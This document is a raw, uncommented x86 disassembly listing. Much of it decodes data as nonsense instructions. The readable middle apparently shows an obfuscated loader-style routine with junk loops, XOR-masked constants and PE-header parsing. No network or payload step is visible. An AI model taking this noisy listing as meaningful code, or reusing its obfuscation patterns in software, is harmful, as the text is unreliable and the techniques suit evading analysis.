  413934:	xchg   ebx,esi
  413936:	mov    ch,BYTE PTR [esp+ecx*8-0x1d81d26a]
  41393d:	retf   
  41393e:	pop    edx
  41393f:	xchg   edx,eax
  413940:	ds retf 0xc20f
  413944:	and    ebp,DWORD PTR [ebx+0x61]
  413947:	js     0x4139a9
  413949:	inc    edx
  41394a:	sbb    al,0x68
  41394c:	jbe    0x413981
  41394e:	scas   al,BYTE PTR es:[edi]
  41394f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413950:	push   0xffffffbf
  413952:	pop    ss
  413953:	(bad)  
  413954:	xor    BYTE PTR [edi-0x5b7965d2],bl
  41395a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41395b:	add    bl,BYTE PTR [ecx-0x5f]
  41395e:	pop    eax
  41395f:	mov    edx,0xc7a1847c
  413964:	dec    ebp
  413965:	rcl    DWORD PTR [eax+0x508a4c22],1
  41396b:	ins    DWORD PTR es:[edi],dx
  41396c:	sbb    eax,0xb6d43d8b
  413971:	cwde   
  413972:	jmp    0x28c51775
  413977:	addr16 in eax,dx
  413979:	xchg   BYTE PTR [ebp-0x36],bh
  41397c:	test   al,0x81
  41397e:	inc    edi
  41397f:	pushf  
  413980:	sti    
  413981:	lods   al,BYTE PTR ds:[esi]
  413982:	aad    0x4f
  413984:	push   ebx
  413985:	fdiv   QWORD PTR [ebx+0xf]
  413988:	jns    0x41391a
  41398a:	mov    ds:0x5b94676a,al
  41398f:	xor    al,0xcc
  413991:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413993:	test   DWORD PTR [ebx+esi*1-0x56365694],ebx
  41399a:	xchg   BYTE PTR [ebp+edi*8-0xd],ah
  41399e:	mov    ebx,0xa1920140
  4139a3:	sti    
  4139a4:	jle    0x413964
  4139a6:	aam    0x1
  4139a8:	ds gs cmp al,0x6f
  4139ac:	std    
  4139ad:	scas   eax,DWORD PTR es:[edi]
  4139ae:	add    eax,DWORD PTR [ebx+edi*1]
  4139b1:	imul   ecx,DWORD PTR [ecx],0xffffffd8
  4139b4:	ror    eax,0x26
  4139b7:	pop    edx
  4139b8:	inc    ecx
  4139b9:	ins    BYTE PTR es:[edi],dx
  4139ba:	addr16 mov eax,0xaeb8f296
  4139c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139c1:	pop    eax
  4139c2:	cmp    dl,ch
  4139c4:	pushf  
  4139c5:	fist   DWORD PTR [ebp-0x73e663f2]
  4139cb:	xor    al,0xd6
  4139cd:	stc    
  4139ce:	push   es
  4139cf:	(bad)  
  4139d0:	push   edi
  4139d1:	mov    bh,0x82
  4139d3:	outs   dx,DWORD PTR ds:[esi]
  4139d4:	stos   BYTE PTR es:[edi],al
  4139d5:	mov    esp,DWORD PTR [ecx+ebp*2-0x70a7f09f]
  4139dc:	jb     0x413a2c
  4139de:	or     BYTE PTR [ebx-0x6248825c],0x9b
  4139e5:	dec    edi
  4139e6:	cli    
  4139e7:	int    0x87
  4139e9:	stc    
  4139ea:	das    
  4139eb:	pop    ss
  4139ec:	pop    ds
  4139ed:	aam    0x4f
  4139ef:	sbb    DWORD PTR [ebx-0x3b1e7ab4],esi
  4139f5:	inc    ebx
  4139f6:	adc    eax,0x87bfea77
  4139fb:	push   edi
  4139fc:	mov    ah,0xf1
  4139fe:	dec    edi
  4139ff:	ror    al,0x67
  413a02:	xchg   ecx,eax
  413a03:	lods   eax,DWORD PTR ds:[esi]
  413a04:	cmp    al,0x2
  413a06:	push   es
  413a07:	inc    esp
  413a08:	ds ret 
  413a0a:	sbb    DWORD PTR [ecx-0x41],edi
  413a0d:	lock push edi
  413a0f:	shl    DWORD PTR [edx+0x55520e3d],cl
  413a15:	popa   
  413a16:	std    
  413a17:	mov    edx,0x229020a1
  413a1c:	(bad)  
  413a1d:	repnz fwait
  413a1f:	out    dx,eax
  413a20:	gs mov esi,0xd1d2a2fe
  413a26:	xor    eax,0x445e470f
  413a2b:	jbe    0x4139b8
  413a2d:	gs icebp 
  413a2f:	mov    al,ds:0xc79bf1ef
  413a34:	js     0x413a2f
  413a36:	jb     0x413aa1
  413a38:	stos   DWORD PTR es:[di],eax
  413a3a:	jge    0x4139d5
  413a3c:	dec    edi
  413a3d:	sub    eax,DWORD PTR [esi-0x53]
  413a40:	retf   0x1b95
  413a43:	stc    
  413a44:	into   
  413a45:	sub    esp,DWORD PTR [esi]
  413a47:	push   ecx
  413a48:	or     DWORD PTR [ecx],edi
  413a4a:	lock mov DWORD PTR [ebx-0x11d207e3],ecx
  413a51:	xchg   ebp,eax
  413a52:	sub    dh,BYTE PTR [edx-0x6e]
  413a55:	dec    esp
  413a56:	int3   
  413a57:	sbb    al,0x31
  413a59:	inc    ebp
  413a5a:	dec    esi
  413a5b:	xor    ebx,ebx
  413a5d:	sbb    ebx,DWORD PTR [ebx-0x4d8791a1]
  413a63:	sbb    DWORD PTR [edx],esp
  413a65:	mov    ah,0x67
  413a67:	mov    edx,0xd83f17f3
  413a6c:	mov    esi,0x7c241c4f
  413a71:	and    al,0xbf
  413a73:	pop    ds
  413a74:	add    bl,BYTE PTR [eax]
  413a76:	cmc    
  413a77:	retf   0x2c25
  413a7a:	xor    ebx,ecx
  413a7c:	clc    
  413a7d:	adc    dl,BYTE PTR [edi-0x27d1f009]
  413a83:	mov    eax,0x19632627
  413a88:	aaa    
  413a89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a8a:	das    
  413a8b:	mov    edx,0x56bcc30e
  413a90:	int    0x9a
  413a92:	scas   al,BYTE PTR es:[edi]
  413a93:	int    0xbe
  413a95:	dec    esi
  413a96:	leave  
  413a97:	stc    
  413a98:	jno    0x413a81
  413a9a:	iret   
  413a9b:	js     0x413b19
  413a9d:	dec    ebp
  413a9f:	out    0x88,al
  413aa1:	nop
  413aa2:	test   BYTE PTR [edx-0x12],0x73
  413aa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413aa7:	adc    DWORD PTR [ecx+0xe],eax
  413aaa:	or     DWORD PTR [ecx-0x6c4aefa1],esp
  413ab0:	pusha  
  413ab1:	(bad)  
  413ab2:	xchg   esp,eax
  413ab3:	jbe    0x413a49
  413ab5:	push   ds
  413ab6:	loop   0x413ab4
  413ab8:	lods   al,BYTE PTR ds:[esi]
  413ab9:	aaa    
  413aba:	sar    ecx,cl
  413abc:	pop    eax
  413abd:	or     al,0x91
  413abf:	adc    edx,DWORD PTR [ebx]
  413ac1:	int3   
  413ac2:	stos   DWORD PTR es:[edi],eax
  413ac3:	push   esp
  413ac4:	aas    
  413ac5:	in     eax,0xe1
  413ac7:	xchg   ebx,eax
  413ac8:	jge    0x413ab4
  413aca:	lahf   
  413acb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413acc:	in     eax,dx
  413acd:	mov    bh,0x7f
  413acf:	gs aad 0x7
  413ad2:	or     ebx,edx
  413ad4:	inc    edi
  413ad5:	or     eax,0xb5c309f8
  413ada:	xor    al,0xcf
  413adc:	dec    ecx
  413add:	inc    ecx
  413ade:	fstp   TBYTE PTR [ebx]
  413ae0:	push   edx
  413ae1:	ins    BYTE PTR es:[edi],dx
  413ae2:	mov    ch,0x57
  413ae4:	out    0xe9,eax
  413ae6:	mov    edx,0x9f1e9f83
  413aeb:	mov    cl,0x60
  413aed:	pop    ecx
  413aee:	stc    
  413aef:	xchg   esi,eax
  413af0:	or     cl,BYTE PTR [ebx-0x47]
  413af3:	std    
  413af4:	push   ebx
  413af5:	ja     0x413b5b
  413af7:	(bad)  
  413af8:	sub    al,0xeb
  413afa:	into   
  413afb:	push   cs
  413afc:	push   0xffffff88
  413afe:	test   al,0x89
  413b00:	add    esi,edi
  413b02:	dec    ebp
  413b03:	add    dh,BYTE PTR [edi]
  413b05:	int3   
  413b06:	shl    BYTE PTR [eax+0x7c],1
  413b09:	push   ss
  413b0a:	aas    
  413b0b:	(bad)  
  413b0c:	fucomi st,st(3)
  413b0e:	xor    al,0xc2
  413b10:	inc    ecx
  413b11:	dec    edi
  413b12:	push   esi
  413b13:	out    0x1b,al
  413b15:	(bad)  
  413b16:	jmp    0x413aca
  413b18:	and    DWORD PTR [esi-0x2d],ebp
  413b1b:	pop    eax
  413b1c:	mov    edi,0x50bd1396
  413b21:	fsubr  DWORD PTR [edi+0x55862035]
  413b27:	or     BYTE PTR [edx],bh
  413b29:	xchg   ebx,eax
  413b2a:	inc    edx
  413b2b:	xchg   ecx,eax
  413b2c:	pop    esp
  413b2d:	xchg   bx,ax
  413b2f:	dec    ebp
  413b30:	push   ds
  413b31:	cwde   
  413b32:	adc    ebp,DWORD PTR [ecx+eiz*8-0x4b]
  413b36:	inc    ebx
  413b37:	mov    ds:0x63246ecf,al
  413b3c:	mov    ecx,0x2a5bae7d
  413b41:	out    0xe6,al
  413b43:	jo     0x413b23
  413b45:	adc    BYTE PTR [ecx-0x16],al
  413b48:	and    al,0xd4
  413b4a:	loopne 0x413b7d
  413b4c:	call   0x1700:0x8ea7084e
  413b53:	xchg   edi,eax
  413b54:	add    eax,0xd8161bee
  413b59:	cmp    al,0x5d
  413b5b:	jle    0x413ae9
  413b5d:	push   ss
  413b5e:	sub    BYTE PTR [esi-0x27],cl
  413b61:	pop    ss
  413b62:	jge    0x413af7
  413b64:	jo     0x413b6d
  413b66:	daa    
  413b67:	xor    ebx,ecx
  413b69:	dec    esp
  413b6a:	sar    DWORD PTR [edx-0x75],0xf0
  413b6e:	scas   eax,DWORD PTR es:[edi]
  413b6f:	pop    eax
  413b70:	stos   DWORD PTR es:[edi],eax
  413b71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b72:	jo     0x413ba9
  413b74:	add    eax,0x515c8a61
  413b79:	enter  0x59b3,0x78
  413b7d:	pop    ss
  413b7e:	stc    
  413b7f:	cmp    esi,DWORD PTR [ebx+0x4443a62e]
  413b85:	mov    ss,WORD PTR [edi-0x2a5620c5]
  413b8b:	popf   
  413b8c:	sbb    DWORD PTR [ebp+0x51],edx
  413b8f:	pop    edi
  413b90:	add    DWORD PTR [ecx],esp
  413b92:	sub    BYTE PTR [ebx+0x16789b1e],ch
  413b98:	ds out dx,al
  413b9a:	cmp    al,0xa0
  413b9c:	jl     0x413bc2
  413b9e:	pop    ebx
  413b9f:	push   esp
  413ba0:	adc    BYTE PTR ds:0xbc8940f9,al
  413ba6:	mov    eax,ds:0x810360dd
  413bab:	pop    eax
  413bac:	in     eax,0x6c
  413bae:	in     al,dx
  413baf:	jmp    0x413c21
  413bb1:	jb     0x413ba1
  413bb3:	xor    dl,BYTE PTR [eax+0x50]
  413bb6:	ret    
  413bb7:	dec    edi
  413bb8:	cdq    
  413bb9:	mov    ecx,0xad42f3ea
  413bbe:	xchg   ebp,eax
  413bbf:	add    bl,ch
  413bc1:	cmp    BYTE PTR [ebx-0x17],bh
  413bc4:	frstor [esi]
  413bc6:	cld    
  413bc7:	lock ss cdq 
  413bca:	adc    edi,DWORD PTR [ecx]
  413bcc:	push   ds
  413bcd:	popa   
  413bce:	push   edi
  413bcf:	fild   DWORD PTR [ecx+0x43]
  413bd2:	imul   edi,DWORD PTR [edx],0x5ee315d9
  413bd8:	mov    DWORD PTR [esi+0x44],eax
  413bdb:	add    ch,BYTE PTR [edx]
  413bdd:	and    BYTE PTR [esi+0x7548220b],al
  413be3:	fistp  WORD PTR [eax+esi*8+0x39705c6]
  413bea:	rol    DWORD PTR [ebx-0x2fcc0029],1
  413bf0:	xor    edi,0x0
  413bf3:	cmp    edx,esi
  413bf5:	jne    0x413c0d
  413bfb:	cmp    edi,ebx
  413bfd:	jne    0x413c0d
  413c03:	mov    eax,ds:0x421ce2
  413c08:	mov    ds:0x421cea,eax
  413c0d:	pop    edi
  413c0e:	pop    esi
  413c0f:	pop    ebx
  413c10:	pop    ebp
  413c11:	ret    0x8
  413c14:	push   ebp
  413c15:	mov    ebp,esp
  413c17:	push   ecx
  413c18:	mov    eax,ds:0x421ab2
  413c1d:	mov    eax,DWORD PTR [eax]
  413c1f:	add    DWORD PTR ds:0x42901c,eax
  413c25:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  413c2c:	mov    eax,DWORD PTR [ebp+0x8]
  413c2f:	adc    DWORD PTR ds:0x42a010,0x6bac
  413c39:	mov    al,BYTE PTR [eax]
  413c3b:	xor    DWORD PTR ds:0x42b018,0x428020
  413c45:	add    al,0xd
  413c47:	sbb    DWORD PTR ds:0x428004,0x428008
  413c51:	xor    al,0x6f
  413c53:	mov    DWORD PTR ds:0x428004,0x2e21
  413c5d:	cmp    al,0x35
  413c5f:	mov    DWORD PTR ds:0x42a00c,0x23cb
  413c69:	jne    0x413d26
  413c6f:	and    DWORD PTR ds:0x428024,0x429014
  413c79:	mov    eax,DWORD PTR [ebp+0x8]
  413c7c:	dec    edx
  413c7d:	mov    ecx,DWORD PTR [ebp+0x8]
  413c80:	and    edx,DWORD PTR ds:0x42b010
  413c86:	add    ecx,DWORD PTR [eax+0x3c]
  413c89:	mov    edx,0x7510893
  413c8e:	mov    DWORD PTR [ebp+0x8],ecx
  413c91:	and    DWORD PTR ds:0x42c008,0x0
  413c9b:	jmp    0x413cad
  413ca0:	mov    ecx,DWORD PTR ds:0x42c008
  413ca6:	inc    ecx
  413ca7:	mov    DWORD PTR ds:0x42c008,ecx
  413cad:	cmp    DWORD PTR ds:0x42c008,0x18
  413cb4:	jae    0x413cf8
  413cba:	cmp    DWORD PTR ds:0x42c008,0x9
  413cc1:	jne    0x413cd7
  413cc7:	push   0x429014
  413ccc:	push   0x5ace
  413cd1:	call   DWORD PTR ds:0x42403c
  413cd7:	cmp    DWORD PTR ds:0x42c008,0x8
  413cde:	jne    0x413cf3
  413ce4:	xor    ecx,ecx
  413ce6:	or     ecx,DWORD PTR ds:0x42c008
  413cec:	inc    ecx
  413ced:	mov    DWORD PTR ds:0x42c008,ecx
  413cf3:	jmp    0x413ca0
  413cf8:	mov    eax,DWORD PTR [ebp-0x4]
  413cfb:	xor    eax,edx
  413cfd:	push   esi
  413cfe:	mov    esi,DWORD PTR [ebp+0x8]
  413d01:	mov    ecx,0x3272db
  413d06:	add    eax,ecx
  413d08:	cmp    DWORD PTR [esi+0x54],eax
  413d0b:	pop    esi
  413d0c:	je     0x413d1a
  413d12:	mov    eax,DWORD PTR [ebp+0x8]
  413d15:	jmp    0x413d33
  413d1a:	mov    eax,DWORD PTR [ebp-0x4]
  413d1d:	xor    eax,edx
  413d1f:	add    eax,ecx
  413d21:	jmp    0x413d33
  413d26:	mov    eax,DWORD PTR [ebp-0x4]
  413d29:	xor    eax,0x7510893
  413d2e:	add    eax,0x3272db
  413d33:	leave  
  413d34:	ret    0x4
  413d37:	push   ebp
  413d38:	mov    ebp,esp
  413d3a:	sub    esp,0x18
  413d3d:	and    DWORD PTR ds:0x42901c,0x0
  413d47:	jmp    0x413d59
  413d4c:	mov    edx,DWORD PTR ds:0x42901c
  413d52:	inc    edx
  413d53:	mov    DWORD PTR ds:0x42901c,edx
  413d59:	cmp    DWORD PTR ds:0x42901c,0x1a
  413d60:	jae    0x413d92
  413d66:	cmp    DWORD PTR ds:0x42901c,0x22
  413d6d:	jne    0x413d83
  413d73:	push   0x8447
  413d78:	push   0x423878
  413d7d:	call   DWORD PTR ds:0x424040
  413d83:	jmp    0x413d4c
  413d88:	adc    DWORD PTR ds:0x42b010,0x42b00c
  413d92:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  413d99:	mov    ecx,DWORD PTR ds:0x421a7e
  413d9f:	mov    ecx,DWORD PTR [ecx]
  413da1:	and    DWORD PTR ds:0x42c01c,ecx
  413da7:	lea    eax,[ebp+0x14]
  413daa:	mov    DWORD PTR [ebp-0x4],eax
  413dad:	push   esi
  413dae:	and    DWORD PTR ds:0x428018,0x0
  413db8:	jmp    0x413dca
  413dbd:	mov    esi,DWORD PTR ds:0x428018
  413dc3:	inc    esi
  413dc4:	mov    DWORD PTR ds:0x428018,esi
  413dca:	cmp    DWORD PTR ds:0x428018,0x1a
  413dd1:	jae    0x413e9f
  413dd7:	cmp    DWORD PTR ds:0x428018,0x28
  413dde:	jne    0x413def
  413de4:	push   0x423893
  413de9:	call   DWORD PTR ds:0x424044
  413def:	jmp    0x413dbd
  413df4:	and    DWORD PTR ds:0x42c000,0x0
  413dfe:	mov    edx,DWORD PTR ds:0x42c000
  413e04:	inc    edx
  413e05:	mov    DWORD PTR ds:0x42c000,edx
  413e0b:	cmp    DWORD PTR ds:0x42c000,0x20
  413e12:	jne    0x413e2d
  413e18:	push   0x1ea1
  413e1d:	push   0x42b008
  413e22:	push   0x423956
  413e27:	call   DWORD PTR ds:0x424048
  413e2d:	cmp    DWORD PTR ds:0x42c000,0x11
  413e34:	jb     0x413dfe
  413e3a:	and    DWORD PTR ds:0x42b004,0x0
  413e44:	mov    edx,DWORD PTR ds:0x42b004
  413e4a:	inc    edx
  413e4b:	mov    DWORD PTR ds:0x42b004,edx
  413e51:	cmp    DWORD PTR ds:0x42b004,0xf
  413e58:	jne    0x413e6e
  413e5e:	push   0x428004
  413e63:	push   0x7cc5
  413e68:	call   DWORD PTR ds:0x424014
  413e6e:	cmp    DWORD PTR ds:0x42b004,0xe
  413e75:	jne    0x413e88
  413e7b:	mov    edx,DWORD PTR ds:0x42b004
  413e81:	inc    edx
  413e82:	mov    DWORD PTR ds:0x42b004,edx
  413e88:	cmp    DWORD PTR ds:0x42b004,0x1d
  413e8f:	jb     0x413e44
  413e95:	mov    DWORD PTR ds:0x428014,0x22a8
  413e9f:	mov    esi,0xf89c85b6
  413ea4:	and    DWORD PTR ds:0x428008,0x0
  413eae:	mov    edx,DWORD PTR ds:0x428008
  413eb4:	inc    edx
  413eb5:	mov    DWORD PTR ds:0x428008,edx
  413ebb:	cmp    DWORD PTR ds:0x428008,0x19
  413ec2:	jne    0x413ef2
  413ec8:	push   0x62e7
  413ecd:	push   0x428000
  413ed2:	push   0x75f3
  413ed7:	push   0x428000
  413edc:	push   DWORD PTR [ebp-0x24]
  413edf:	push   0x6458
  413ee4:	push   DWORD PTR [ebp-0x14]
  413ee7:	push   0x5743
  413eec:	call   DWORD PTR ds:0x424018
  413ef2:	cmp    DWORD PTR ds:0x428008,0x14
  413ef9:	jb     0x413eae
  413eff:	xor    ecx,ecx
  413f01:	add    ecx,DWORD PTR ds:0x429008
  413f07:	adc    DWORD PTR ds:0x42c00c,ecx
  413f0d:	mov    DWORD PTR [ebp-0xc],esi
  413f10:	lea    eax,[ebp-0xc]
  413f13:	dec    ecx
  413f14:	mov    DWORD PTR [ebp-0x14],eax
  413f17:	mov    eax,DWORD PTR [ebp-0xc]
  413f1a:	adc    ecx,0x29e6
  413f20:	mov    edx,DWORD PTR [ebp-0x14]
  413f23:	and    DWORD PTR ds:0x428018,0x0
  413f2d:	mov    ecx,DWORD PTR ds:0x428018
  413f33:	inc    ecx
  413f34:	mov    DWORD PTR ds:0x428018,ecx
  413f3a:	cmp    DWORD PTR ds:0x428018,0xb
  413f41:	jne    0x413f52
  413f47:	push   0x4faf
  413f4c:	call   DWORD PTR ds:0x42401c
  413f52:	cmp    DWORD PTR ds:0x428018,0xa
  413f59:	jne    0x413f6c
  413f5f:	mov    ecx,DWORD PTR ds:0x428018
  413f65:	inc    ecx
  413f66:	mov    DWORD PTR ds:0x428018,ecx
  413f6c:	cmp    DWORD PTR ds:0x428018,0x1e
  413f73:	jb     0x413f2d
  413f79:	inc    ecx
  413f7a:	mov    ecx,0x7510893
  413f7f:	neg    DWORD PTR ds:0x42a004
  413f85:	xor    eax,ecx
  413f87:	add    eax,0x3272db
  413f8c:	and    DWORD PTR ds:0x42c010,0x2759
  413f96:	mov    DWORD PTR [edx],eax
  413f98:	mov    edx,DWORD PTR ds:0x421a76
  413f9e:	mov    eax,ds:0x421a86
  413fa3:	sub    edx,eax
  413fa5:	and    edx,DWORD PTR [edx+eax*1]
  413fa8:	mov    eax,ds:0x421ade
  413fad:	inc    DWORD PTR ds:0x42a01c
  413fb3:	mov    edx,DWORD PTR [ebp-0x4]
  413fb6:	and    DWORD PTR ds:0x42a018,0x7b9c
  413fc0:	mov    eax,DWORD PTR [eax]
  413fc2:	and    DWORD PTR ds:0x42c000,0x5f81
  413fcc:	add    eax,DWORD PTR [edx]
  413fce:	movzx  edx,BYTE PTR ds:0x42a014
  413fd5:	or     DWORD PTR ds:0x42a01c,edx
  413fdb:	push   edi
  413fdc:	add    DWORD PTR ds:0x42a004,edx
  413fe2:	mov    DWORD PTR [ebp-0x8],eax
  413fe5:	movzx  edx,WORD PTR ds:0x428004
  413fec:	sbb    DWORD PTR ds:0x42a01c,edx
  413ff2:	mov    edi,DWORD PTR [ebp+0x8]
  413ff5:	and    DWORD PTR ds:0x42b01c,0x631e
  413fff:	mov    eax,ds:0x421c66
  414004:	mov    eax,DWORD PTR [eax+0x198]
  41400a:	xor    edi,ecx
  41400c:	mov    DWORD PTR ds:0x428018,0x14
  414016:	cmp    DWORD PTR ds:0x428018,0x0
  41401d:	je     0x414070
  414023:	cmp    DWORD PTR ds:0x428018,0x3
  41402a:	jne    0x41403e
  414030:	push   DWORD PTR [ebp-0x28]
  414033:	push   0x77dc
  414038:	call   DWORD PTR ds:0x424020
  41403e:	cmp    DWORD PTR ds:0x428018,0x4
  414045:	jne    0x414058
  41404b:	mov    edx,DWORD PTR ds:0x428018
  414051:	dec    edx
  414052:	mov    DWORD PTR ds:0x428018,edx
  414058:	mov    edx,DWORD PTR ds:0x428018
  41405e:	dec    edx
  41405f:	mov    DWORD PTR ds:0x428018,edx
  414065:	jmp    0x414016
  41406a:	and    DWORD PTR ds:0x42c014,ecx
  414070:	mov    edx,0x3272db
  414075:	sbb    DWORD PTR ds:0x429008,0x451c
  41407f:	add    edi,edx
  414081:	mov    DWORD PTR ds:0x42a000,0x2432
  41408b:	cmp    DWORD PTR [eax],edi
  41408d:	je     0x41409a
  414093:	mov    eax,DWORD PTR [eax]
  414095:	jmp    0x41ae5c
  41409a:	mov    eax,DWORD PTR [ebp+0x18]
  41409d:	cmp    eax,esi
  41409f:	jne    0x4140b9
  4140a5:	mov    DWORD PTR ds:0x42a01c,0x2296
  4140af:	push   0xf89c85b5
  4140b4:	jmp    0x41ae4b
  4140b9:	mov    esi,DWORD PTR [ebp+0x18]
  4140bc:	mov    eax,0x2f4e
  4140c1:	mov    eax,0xf89c85b4
  4140c6:	cmp    esi,eax
  4140c8:	jne    0x41ae3b
  4140ce:	sbb    esi,esi
  4140d0:	mov    eax,DWORD PTR [ebp+0x10]
  4140d3:	mov    esi,DWORD PTR ds:0x42c008
  4140d9:	sbb    esi,DWORD PTR ds:0x42a008
  4140df:	mov    DWORD PTR ds:0x42c008,esi
  4140e5:	xor    eax,ecx
  4140e7:	mov    DWORD PTR ds:0x428000,0x1b
  4140f1:	cmp    DWORD PTR ds:0x428000,0x0
  4140f8:	je     0x414161
  4140fe:	cmp    DWORD PTR ds:0x428000,0x4
  414105:	jne    0x414135
  41410b:	push   0x42a000
  414110:	push   0x8ffd
  414115:	push   DWORD PTR [ebp-0x14]
  414118:	push   0x428014
  41411d:	push   0x2d9f
  414122:	push   0x4239d0
  414127:	push   0x4cf3
  41412c:	push   DWORD PTR [ebp-0x1c]
  41412f:	call   DWORD PTR ds:0x424024
  414135:	cmp    DWORD PTR ds:0x428000,0x5
  41413c:	jne    0x41414f
  414142:	mov    esi,DWORD PTR ds:0x428000
  414148:	dec    esi
  414149:	mov    DWORD PTR ds:0x428000,esi
  41414f:	mov    esi,DWORD PTR ds:0x428000
  414155:	dec    esi
  414156:	mov    DWORD PTR ds:0x428000,esi
  41415c:	jmp    0x4140f1
  414161:	add    eax,edx
  414163:	mov    DWORD PTR [ebp-0x18],eax
  414166:	mov    eax,DWORD PTR [ebp+0xc]
  414169:	mov    esi,DWORD PTR [ebp-0x8]
  41416c:	xor    eax,ecx
  41416e:	add    eax,edx
  414170:	imul   eax,DWORD PTR [esi]
  414173:	mov    esi,DWORD PTR [ebp+0x8]
  414176:	xor    esi,ecx
  414178:	add    esi,edx
  41417a:	cmp    esi,eax
  41417c:	mov    eax,DWORD PTR [ebp-0x4]
  41417f:	push   ebx
  414180:	je     0x41419f
  414186:	mov    esi,DWORD PTR [ebp-0x18]
  414189:	add    DWORD PTR [eax],esi
  41418b:	mov    eax,DWORD PTR [ebp-0x4]
  41418e:	mov    esi,DWORD PTR [ebp+0xc]
  414191:	xor    esi,ecx
  414193:	add    esi,edx
  414195:	imul   esi,DWORD PTR [eax]
  414198:	mov    DWORD PTR [eax],esi
  41419a:	jmp    0x4141a4
  41419f:	mov    esi,DWORD PTR [ebp+0x14]
  4141a2:	xor    DWORD PTR [eax],esi
  4141a4:	mov    eax,DWORD PTR [ebp-0x4]
  4141a7:	mov    edi,DWORD PTR [ebp+0x10]
  4141aa:	xor    edi,ecx
  4141ac:	mov    esi,0xffcd8d25
  4141b1:	mov    ebx,esi
  4141b3:	sub    ebx,edi
  4141b5:	add    DWORD PTR [eax],ebx
  4141b7:	mov    eax,DWORD PTR [ebp-0x4]
  4141ba:	mov    edi,DWORD PTR [ebp-0x8]
  4141bd:	add    edi,DWORD PTR [eax]
  4141bf:	mov    DWORD PTR [ebp-0x8],edi
  4141c2:	mov    eax,DWORD PTR [ebp+0xc]
  4141c5:	mov    edi,DWORD PTR [ebp+0xc]
  4141c8:	xor    edi,ecx
  4141ca:	xor    eax,ecx
  4141cc:	lea    eax,[eax+edi*1+0x64e5b6]
  4141d3:	mov    edi,DWORD PTR [ebp+0xc]
  4141d6:	xor    edi,ecx
  4141d8:	add    edi,edx
  4141da:	imul   eax,edi
  4141dd:	mov    edi,DWORD PTR [ebp+0xc]
  4141e0:	xor    edi,ecx
  4141e2:	sub    edi,eax
  4141e4:	mov    eax,DWORD PTR [ebp-0x4]
  4141e7:	add    edi,edx
  4141e9:	cmp    DWORD PTR [eax],edi
  4141eb:	mov    eax,DWORD PTR [ebp-0x4]
  4141ee:	mov    edi,DWORD PTR [ebp+0x10]
  4141f1:	jg     0x414204
  4141f7:	xor    edi,ecx
  4141f9:	mov    ebx,esi
  4141fb:	sub    ebx,edi
  4141fd:	add    DWORD PTR [eax],ebx
  4141ff:	jmp    0x41420a
  414204:	xor    edi,ecx
  414206:	add    edi,edx
  414208:	add    DWORD PTR [eax],edi
  41420a:	mov    eax,DWORD PTR [ebp-0x8]
  41420d:	mov    edi,DWORD PTR [ebp-0x10]
  414210:	mov    eax,DWORD PTR [eax]
  414212:	xor    edi,ecx
  414214:	add    edi,0x3272da
  41421a:	not    edi
  41421c:	and    eax,edi
  41421e:	movsx  di,BYTE PTR [eax+0x1]
  414223:	mov    ebx,0x3b4b
  414228:	sub    di,bx
  41422b:	mov    ebx,0x8a85
  414230:	xor    di,bx
  414233:	mov    ebx,0x4f8a
  414238:	cmp    di,bx
  41423b:	jmp    0x4165fa
  414240:	out    dx,al
  414241:	add    eax,0x6723a723
  414246:	outs   dx,BYTE PTR ds:[esi]
  414247:	sbb    DWORD PTR [edx+0x1b],0xf
  41424b:	hlt    
  41424c:	add    al,0x90
  41424e:	enter  0x7d88,0x46
  414252:	popa   
  414253:	(bad)  
  414254:	rcr    BYTE PTR [edi+0x62],0x62
  414258:	dec    esp
  414259:	mov    WORD PTR [esi-0x6a],fs
  41425c:	and    BYTE PTR [edi+0x51d664d2],0xb8
  414263:	dec    edx
  414264:	mov    ds:0x842f74e3,eax
  414269:	ss enter 0xebdf,0xa6
  41426e:	je     0x41423b
  414270:	in     al,dx
  414271:	into   
  414272:	hlt    
  414273:	aaa    
  414274:	shl    BYTE PTR [edx],0x86
  414277:	push   ecx
  414278:	pop    ecx
  414279:	mov    esp,DWORD PTR [ecx+ecx*2+0x2a]
  41427d:	sub    al,0x50
  41427f:	fucom  st(5)
  414281:	fstp   DWORD PTR [ebx+0x13f274f7]
  414287:	lods   eax,DWORD PTR ds:[esi]
  414288:	ret    0xaec3
  41428b:	sub    dl,dl
  41428d:	(bad)  
  41428f:	aaa    
  414290:	inc    esp
  414291:	push   eax
  414292:	add    ebp,DWORD PTR [edx]
  414294:	mov    eax,DWORD PTR [edi+0x52]
  414297:	xchg   edi,eax
  414298:	push   esp
  414299:	cmp    eax,0x2c6b8e5
  41429e:	loope  0x41423d
  4142a0:	outs   dx,BYTE PTR ds:[esi]
  4142a1:	leave  
  4142a2:	in     al,dx
  4142a3:	xchg   esp,eax
  4142a4:	mov    edi,edx
  4142a6:	cmp    al,0xb
  4142a8:	pusha  
  4142a9:	dec    edx
  4142aa:	inc    esp
  4142ab:	in     eax,0x77
  4142ad:	xchg   ecx,eax
  4142ae:	xor    edi,DWORD PTR [edx-0x242da4a1]
  4142b4:	and    ebp,ecx
  4142b6:	lea    eax,[esi]
  4142b8:	sub    eax,0x6449adb4
  4142bd:	fs xchg esp,eax
  4142bf:	inc    edx
  4142c0:	into   
  4142c1:	loope  0x4142e0
  4142c3:	push   cs
  4142c4:	sbb    eax,0x91ef2da
  4142c9:	sbb    eax,0x868cbb27
  4142ce:	mov    ds:0x47abd6bc,eax
  4142d3:	adc    al,0xcc
  4142d5:	xchg   BYTE PTR [ebx+0x26931164],bl
  4142db:	xchg   esi,eax
  4142dc:	jo     0x41432a
  4142de:	fmul   QWORD PTR [ecx+0x21]
  4142e1:	and    ch,BYTE PTR [edx+ecx*4]
  4142e4:	add    DWORD PTR [edx],esi
  4142e6:	out    0xb2,al
  4142e8:	punpckldq mm2,DWORD PTR [ebp+0x7d011b6e]
  4142ef:	in     al,dx
  4142f0:	icebp  
  4142f1:	mov    ecx,0xabdf74e1
  4142f6:	fldenv [ecx+0x49]
  4142f9:	inc    ebp
